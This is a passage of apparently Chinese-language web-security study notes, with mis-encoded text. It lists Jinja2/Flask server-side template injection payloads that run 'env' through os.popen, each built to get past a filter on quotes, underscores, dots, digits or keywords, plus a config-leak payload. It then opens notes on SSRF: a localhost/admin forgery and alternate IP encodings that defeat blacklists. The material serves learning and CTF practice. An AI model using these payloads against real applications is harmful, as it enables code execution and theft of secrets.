<li>è¿‡æ»¤å•å¼•å·å’ŒåŒå¼•å·  ä»httpè¯·æ±‚æ±‡æ€»è·å–è¿™äº›å­—ç¬¦ä¸²çš„å‚æ•°ï¼Œå› ä¸º<br>flask ä¸­æœ‰ä¸€ä¸ª request å¯¹è±¡ï¼Œæœ‰ args (æŸ¥è¯¢å‚æ•°), form (è¡¨å•æ•°æ®), values (æŸ¥è¯¢å‚æ•° + è¡¨å•å‚æ•°) ç­‰å±æ€§ request å¯¹è±¡å§‹ç»ˆæŒ‡ä»£å½“å‰å¤„ç†çš„ HTTP è¯·æ±‚  éœ€è¦åœ¨bpä¸­å‘é€è¿™ä¸ªurlå‚æ•°</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__base__.__subclasses__()[<span class="number">80</span>].__init__.__globals__[request.args.a1](request.args.a2).popen(request.args.a3).read()&#125;&#125; </span><br><span class="line"></span><br><span class="line">?a1=<span class="built_in">__import__</span>&amp;a2=os&amp;a3=env</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤<code>_</code> ç»“åˆ attr() ä¸ | ä¸€å±‚ä¸€å±‚è®¿é—®<br>attr(obj, name) æ˜¯ä¸€ä¸ª Jinja2 çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºä»å¯¹è±¡ obj ä¸­åŠ¨æ€è®¿é—®å±æ€§æˆ–æ–¹æ³•ï¼Œå±æ€§åé€šè¿‡ name æä¾›</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;((<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)())[<span class="number">80</span>]|attr(<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>))[<span class="string">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;env&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤<code>.</code> å’Œä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ï¼Œç”¨attrè®¿é—®å¯¹è±¡çš„å±æ€§ ç”¨ç®¡é“ç¬¦<code>|</code>è¿æ¥å°±ä¸ä¼šç”¨åˆ°.</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;((<span class="string">&#x27;&#x27;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">80</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>))[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)|attr(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;env&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤class init args requests baseè¿™äº›å…³é”®å­—<br>æ ¹æ®å±æ€§é™¤äº†.è®¿é—®ï¼Œè¿˜èƒ½ç”¨ä¸­æ‹¬å·è®¿é—®ï¼Œç„¶åæŠŠè¢«è¿‡æ»¤çš„å…³é”®å­—ä¸­çš„å‡ ä¸ªå­—ç¬¦ç”¨16è¿›åˆ¶æ•°æ”¹å†™</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cl\x61ss__&#x27;</span>][<span class="string">&#x27;__b\x61se__&#x27;</span>][<span class="string">&#x27;__subcl\x61sses__&#x27;</span>]()[<span class="number">80</span>][<span class="string">&#x27;__i\x6eit__&#x27;</span>][<span class="string">&#x27;__glob\x61ls__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;pope\x6e&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤æ•°å­— æ— æ³•é€šè¿‡ä¸‹è¡¨è®¿é—®å­ç±»ï¼Œé‚£å°±ç”¨é€šç”¨payloadçš„å¾ªç¯æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç±»å°±å¯ä»¥ æˆ–è€…å¯ä»¥æŠŠ ç¬¬80ä¸ªå­ç±»çš„åå­—ç”¨.__name__æ‰“å°å‡ºæ¥ç„¶åç”¨forå¾ªç¯æ‰¾åˆ°è¿™ä¸ªç±»</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> x.__init__ <span class="keyword">is</span> defined <span class="keyword">and</span> x.__init__.__globals__ <span class="keyword">is</span> defined <span class="keyword">and</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>].__name__ %&#125;</span><br><span class="line">        &#123;&#123; x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>set config &#x3D; None è¦get config<br>åœ¨ Flask ä¸­ï¼Œ<code>url_for</code> æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆ URL çš„å‡½æ•°ï¼Œè€Œ <code>current_app</code> æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰ Flask åº”ç”¨å®ä¾‹çš„å…¨å±€ä»£ç†å¯¹è±¡ã€‚å½“åœ¨ Jinja2 æ¨¡æ¿ä¸­ä½¿ç”¨ <code>url_for</code> æ—¶ï¼Œå¯ä»¥é€šè¿‡è®¿é—®å…¶ <code>__globals__</code> å±æ€§æ¥è·å–å½“å‰åº”ç”¨å®ä¾‹ï¼Œå³ <code>current_app</code>ï¼Œè¿›è€Œè®¿é—®å…¶ <code>config</code> å±æ€§ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤<code>&#39; &quot; + request . [ ]</code><br>è§£å†³. å’Œä¸­æ‹¬å·å’Œä¹‹å‰çš„æ–¹æ³•ä¸€æ · ç”¨attrå’Œgetitem</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;</span>|attr(<span class="name">&#x27;__class__&#x27;</span>)|attr(<span class="name">&#x27;__base__&#x27;</span>)|attr(<span class="name">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="name">&#x27;__getitem__&#x27;</span>)(<span class="name">80</span>)|attr(<span class="name">&#x27;__init__&#x27;</span>)|attr(<span class="name">&#x27;__globals__&#x27;</span>)|attr(<span class="name">&#x27;__getitem__&#x27;</span>)(<span class="name">&#x27;__import__&#x27;</span>)(<span class="name">&#x27;os&#x27;</span>)|attr(<span class="name">&#x27;popen&#x27;</span>)(<span class="name">&#x27;env&#x27;</span>)|attr(<span class="name">&#x27;read&#x27;</span>)()&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯ç°åœ¨å‚æ•°ä¸èƒ½ç”¨requestäº† è§£å†³æ–¹æ¡ˆæ˜¯ç”¨setå®šä¹‰å­—å…¸ï¼Œå› ä¸ºé”®å’Œå€¼ä¸ç”¨å¼•å· jinja2ä¸­joinè½¬æ¢æˆstrï¼Œå­—å…¸ä¸­åªè½¬æ¢é”®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> c=<span class="built_in">dict</span>(__class__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> b=<span class="built_in">dict</span>(__base__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> s=<span class="built_in">dict</span>(__subclasses__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gi=<span class="built_in">dict</span>(__getitem__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init=<span class="built_in">dict</span>(__init__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gl=<span class="built_in">dict</span>(__globals__=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> im=<span class="built_in">dict</span>(<span class="built_in">__import__</span>=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> p=<span class="built_in">dict</span>(popen=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="built_in">dict</span>(env=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> r=<span class="built_in">dict</span>(read=wtf)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;c|attr(c)|attr(b)|attr(s)()|attr(gi)(<span class="number">80</span>)|attr(init)|attr(gl)|attr(gi)(im)(o)|attr(p)(e)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤<code>_ . 0-9 \ &#39; &quot; [ ]</code><br>å…ˆåœ¨ç¬¬ä¸€å…³ä¸­æ‰¾åˆ°<code>_</code>çš„ç´¢å¼•å®šä½</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HANDLEBARS"><figure class="iseeu highlight /handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;(<span class="name">config</span>|string).index(<span class="name">&#x27;_&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>æ•°å­—ç”¨å­—å…¸è½¬å­—ç¬¦ä¸²+count<br>å…ˆæŠŠcongfigè½¬æˆå­—ç¬¦ åˆ—è¡¨ ç„¶åç”¨popç§»é™¤å¹¶è¿”å›å…¶å­—ç¬¦åˆ—è¡¨ä¸­ç´¢å¼•ä¸º 64 çš„å…ƒç´  ä¹Ÿå°±æ˜¯ä¸‹åˆ’çº¿</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> eighty=<span class="built_in">dict</span>(aaaaabbbbbcccccdddddaaaaabbbbbcccccdddddaaaaabbbbbcccccdddddaaaaabbbbbcccccddddd=wtf)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> six=<span class="built_in">dict</span>(aaaaaa=wtf)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> sf=eighty-six %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> p = <span class="built_in">dict</span>(pop=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> underline=config|string|<span class="built_in">list</span>|attr(p)(sf) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> c=(underline,underline,<span class="built_in">dict</span>(<span class="keyword">class</span>=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> b=(underline,underline,<span class="built_in">dict</span>(base=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> s=(underline,underline,<span class="built_in">dict</span>(subclasses=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gi=(underline,underline,<span class="built_in">dict</span>(getitem=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> init=(underline,underline,<span class="built_in">dict</span>(init=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gl=(underline,underline,<span class="built_in">dict</span>(<span class="built_in">globals</span>=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> im=(underline,underline,<span class="built_in">dict</span>(<span class="keyword">import</span>=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> p=<span class="built_in">dict</span>(popen=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="built_in">dict</span>(env=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> r=<span class="built_in">dict</span>(read=wtf)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;c|attr(c)|attr(b)|attr(s)()|attr(gi)(eighty)|attr(init)|attr(gl)|attr(gi)(im)(o)|attr(p)(e)|attr(r)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li>è¿‡æ»¤<code> _ . \ &#39; &quot; request + class init arg config app self [ ]</code><br>ç»„åˆå‰é¢çš„payload  lipsumæ˜¯jinja2çš„å…¨å±€å‡½æ•° åœ¨æœ¬åœ°æ‰§è¡Œä¸€ä¸‹<code>&#123;% set strs=lipsum|string|list %&#125;</code> å¯ä»¥å¾—åˆ°å¾ˆå¤šå­—ç¬¦çš„åˆ—è¡¨ï¼Œç„¶åç”¨popæ‰¾ä¸‹åˆ’çº¿</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> p = <span class="built_in">dict</span>(pop=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> underline=lipsum|string|<span class="built_in">list</span>|attr(p)(<span class="number">18</span>) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> c=(underline,underline,<span class="built_in">dict</span>(cl=wtf)|join,<span class="built_in">dict</span>(ass=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> b=(underline,underline,<span class="built_in">dict</span>(base=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> s=(underline,underline,<span class="built_in">dict</span>(subcl=wtf)|join,<span class="built_in">dict</span>(asses=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gi=(underline,underline,<span class="built_in">dict</span>(getitem=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="keyword">in</span>=(underline,underline,<span class="built_in">dict</span>(<span class="keyword">in</span>=wtf)|join,<span class="built_in">dict</span>(it=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gl=(underline,underline,<span class="built_in">dict</span>(<span class="built_in">globals</span>=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> im=(underline,underline,<span class="built_in">dict</span>(<span class="keyword">import</span>=wtf)|join,underline,underline)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> o=<span class="built_in">dict</span>(os=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> p=<span class="built_in">dict</span>(popen=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> e=<span class="built_in">dict</span>(env=wtf)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> r=<span class="built_in">dict</span>(read=wtf)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;c|attr(c)|attr(b)|attr(s)()|attr(gi)(<span class="number">80</span>)|attr(<span class="keyword">in</span>)|attr(gl)|attr(gi)(im)(o)|attr(p)(e)|attr(r)()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="å‚è€ƒæ¥æº"><a href="#å‚è€ƒæ¥æº" class="headerlink" title="å‚è€ƒæ¥æº"></a>å‚è€ƒæ¥æº</h1><p><a href="https://blog.csdn.net/q7w8e9r4/article/details/133745524">https://blog.csdn.net/q7w8e9r4/article/details/133745524</a><br><a href="https://blog.csdn.net/mkgdjing/article/details/87971138">https://blog.csdn.net/mkgdjing/article/details/87971138</a><br><a href="https://www.bilibili.com/video/BV1FD421u75B/?spm_id_from=333.1365.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV1FD421u75B/?spm_id_from=333.1365.top_right_bar_window_history.content.click</a><br><a href="https://hello-ctf.com/hc-web/ssti/#_12">https://hello-ctf.com/hc-web/ssti/#_12</a><br><a href="https://www.kkayu.com/archive/2">https://www.kkayu.com/archive/2</a></p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRFæ¼æ´å­¦ä¹ ç¬”è®°</title>
    <url>/posts/37808.html</url>
    <content><![CDATA[<p>SSRFæ¼æ´å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>

<h2 id="ä»€ä¹ˆæ˜¯SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´"><a href="#ä»€ä¹ˆæ˜¯SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´" class="headerlink" title="ä»€ä¹ˆæ˜¯SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´"></a>ä»€ä¹ˆæ˜¯SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´</h2><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¯¼è‡´æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºå‘éé¢„æœŸä½ç½®å‘å‡ºè¯·æ±‚ã€‚<br>ä¸€äº›æœåŠ¡åªå…è®¸åœ¨å†…éƒ¨çš„æœåŠ¡å™¨ä¹‹é—´è®¿é—®ï¼ŒSSRFæ¼æ´å°±æ˜¯è®©æœåŠ¡å™¨è®¿é—®å¤–éƒ¨çš„èµ„æºï¼Œä»è€Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„æ¼ã€å‘½ä»¤æ‰§è¡Œç­‰é—®é¢˜</p>
<h2 id="å¸¸è§çš„SSRFæ”»å‡»"><a href="#å¸¸è§çš„SSRFæ”»å‡»" class="headerlink" title="å¸¸è§çš„SSRFæ”»å‡»"></a>å¸¸è§çš„SSRFæ”»å‡»</h2><p>SSRF æ”»å‡»é€šå¸¸åˆ©ç”¨ä¿¡ä»»å…³ç³»æ¥å‡çº§æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºçš„æ”»å‡»å¹¶æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚è¿™äº›ä¿¡ä»»å…³ç³»å¯èƒ½ä¸æœåŠ¡å™¨æœ‰å…³ï¼Œä¹Ÿå¯èƒ½ä¸åŒä¸€ç»„ç»‡å†…çš„å…¶ä»–åç«¯ç³»ç»Ÿæœ‰å…³ã€‚</p>
<h3 id="é’ˆå¯¹æœåŠ¡å™¨çš„SSRFæ”»å‡»"><a href="#é’ˆå¯¹æœåŠ¡å™¨çš„SSRFæ”»å‡»" class="headerlink" title="é’ˆå¯¹æœåŠ¡å™¨çš„SSRFæ”»å‡»"></a>é’ˆå¯¹æœåŠ¡å™¨çš„SSRFæ”»å‡»</h3><p>åœ¨é’ˆå¯¹æœåŠ¡å™¨çš„ SSRF æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šè®©åº”ç”¨ç¨‹åºé€šè¿‡å…¶ç¯å›ç½‘ç»œæ¥å£ï¼ˆæ¯”å¦‚127.0.0.1æˆ–è€…localhostï¼‰å‘æ‰˜ç®¡è¯¥åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªè´­ç‰©åº”ç”¨ç¨‹åºï¼Œå®ƒå…è®¸ç”¨æˆ·æŸ¥çœ‹æŸä¸ªå•†åº—ä¸­æŸä»¶å•†å“æ˜¯å¦æœ‰è´§ã€‚ä¸ºäº†æä¾›åº“å­˜ä¿¡æ¯ï¼Œè¯¥åº”ç”¨ç¨‹åºå¿…é¡»æŸ¥è¯¢å„ç§åç«¯ REST APIã€‚å®ƒé€šè¿‡å‰ç«¯ HTTP è¯·æ±‚å°† URL ä¼ é€’åˆ°ç›¸å…³çš„åç«¯ API ç«¯ç‚¹æ¥å®ç°è¿™ä¸€ç‚¹ã€‚å½“ç”¨æˆ·æŸ¥çœ‹æŸä»¶å•†å“çš„åº“å­˜çŠ¶æ€æ—¶ï¼Œä»–ä»¬çš„æµè§ˆå™¨ä¼šå‘å‡ºä»¥ä¸‹è¯·æ±‚ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/product/stock</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>118</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">stockApi</span>=http://stock.weliketoshop.net:<span class="number">8080</span>/product/stock/check%<span class="number">3</span>FproductId%<span class="number">3</span>D6%<span class="number">26</span>storeId%<span class="number">3</span>D1</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¼šå¯¼è‡´æœåŠ¡å™¨å‘æŒ‡å®šçš„ URL å‘å‡ºè¯·æ±‚ï¼Œæ£€ç´¢åº“å­˜çŠ¶æ€ï¼Œå¹¶å°†å…¶è¿”å›ç»™ç”¨æˆ·ã€‚<br>å¦‚æœæ”»å‡»è€…å¯ä»¥æŒ‡å®šè®¿é—®çš„URL å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">stockApi</span>=http://localhost/admin</span><br></pre></td></tr></table></figure></div>
<p>é‚£æœåŠ¡å™¨å°±ä¼šè·å–&#x2F;adminçš„å†…å®¹è¿”å›ç»™ç”¨æˆ·<br>ä½†ç®¡ç†åŠŸèƒ½é€šå¸¸åªæœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ‰èƒ½è®¿é—®ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…ä¸ä¼šçœ‹åˆ°ä»»ä½•æœ‰è¶£çš„ä¸œè¥¿ä½†æ˜¯ï¼Œå¦‚æœå¯¹ &#x2F;admin URL çš„è¯·æ±‚æ¥è‡ªæœ¬åœ°è®¡ç®—æœºï¼Œåˆ™æ­£å¸¸çš„è®¿é—®æ§åˆ¶å°†è¢«ç»•è¿‡ã€‚<br><img src="https://pic1.imgdb.cn/item/67c30d9bd0e0a243d4093278.png"><br>æ¯”å¦‚è¿™é‡Œè®¿é—®å•†å“åº“å­˜çš„æ—¶å€™æœ‰ä¸€ä¸ª<code>stockApi</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‰å»è®¿é—®localhost&#x2F;adminï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆ é™¤ç”¨æˆ·çš„é€‰é¡¹ï¼Œä½†æ˜¯ä¸€èˆ¬æœ‰ç®¡ç†å‘˜èº«ä»½éªŒè¯ï¼Œæ— æ³•åˆ é™¤ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯getè¯·æ±‚ï¼Œç”¨urlè®¿é—®çš„ï¼Œæ‰€ä»¥å¯ä»¥è®°ä¸‹è¿™çš„urlç„¶åå†åˆ©ç”¨localhostæ¥ä¼ªé€ è¿™ä¸ªè¯·æ±‚ï¼Œå°±å¯ä»¥ç»•è¿‡æ£€æµ‹</p>
<h3 id="é’ˆå¯¹å…¶ä»–åç«¯ç³»ç»Ÿçš„-SSRF-æ”»å‡»"><a href="#é’ˆå¯¹å…¶ä»–åç«¯ç³»ç»Ÿçš„-SSRF-æ”»å‡»" class="headerlink" title="é’ˆå¯¹å…¶ä»–åç«¯ç³»ç»Ÿçš„ SSRF æ”»å‡»"></a>é’ˆå¯¹å…¶ä»–åç«¯ç³»ç»Ÿçš„ SSRF æ”»å‡»</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåº”ç”¨æœåŠ¡å™¨èƒ½å¤Ÿä¸ç”¨æˆ·æ— æ³•ç›´æ¥è®¿é—®çš„åç«¯ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚è¿™äº›ç³»ç»Ÿé€šå¸¸å…·æœ‰ä¸å¯è·¯ç”±çš„ç§æœ‰ IP åœ°å€ã€‚åç«¯ç³»ç»Ÿé€šå¸¸å—ç½‘ç»œæ‹“æ‰‘ä¿æŠ¤ï¼Œå› æ­¤å®ƒä»¬çš„å®‰å…¨çŠ¶å†µé€šå¸¸è¾ƒå¼±ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œå†…éƒ¨åç«¯ç³»ç»ŸåŒ…å«æ•æ„ŸåŠŸèƒ½ï¼Œä»»ä½•èƒ½å¤Ÿä¸ç³»ç»Ÿäº¤äº’çš„äººéƒ½å¯ä»¥åœ¨æœªç»èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è®¿é—®è¿™äº›åŠŸèƒ½ã€‚</p>
<h2 id="ç»•è¿‡SSRFå¸¸è§çš„é˜²å¾¡"><a href="#ç»•è¿‡SSRFå¸¸è§çš„é˜²å¾¡" class="headerlink" title="ç»•è¿‡SSRFå¸¸è§çš„é˜²å¾¡"></a>ç»•è¿‡SSRFå¸¸è§çš„é˜²å¾¡</h2><h3 id="å…·æœ‰åŸºäºé»‘åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„-SSRF"><a href="#å…·æœ‰åŸºäºé»‘åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„-SSRF" class="headerlink" title="å…·æœ‰åŸºäºé»‘åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„ SSRF"></a>å…·æœ‰åŸºäºé»‘åå•çš„è¾“å…¥è¿‡æ»¤å™¨çš„ SSRF</h3><p>æŸäº›åº”ç”¨ç¨‹åºä¼šé˜»æ­¢åŒ…å«ä¸»æœºåï¼ˆå¦‚ 127.0.0.1 å’Œ localhost æˆ–æ•æ„Ÿ URLï¼ˆå¦‚ &#x2F;admin çš„è¾“å…¥ã€‚å¯ä»¥ç”¨ä»¥ä¸‹å‡ ç§è¿‡æ»¤æ–¹æ³•</p>
<ul>
<li>ä½¿ç”¨ 127.0.0.1 çš„æ›¿ä»£ IP è¡¨ç¤ºå½¢å¼ï¼Œä¾‹å¦‚ 2130706433 æˆ– 127.1 017700000001  ï¼ˆä¸åŒçš„è¿›åˆ¶ï¼‰</li>
</ul>
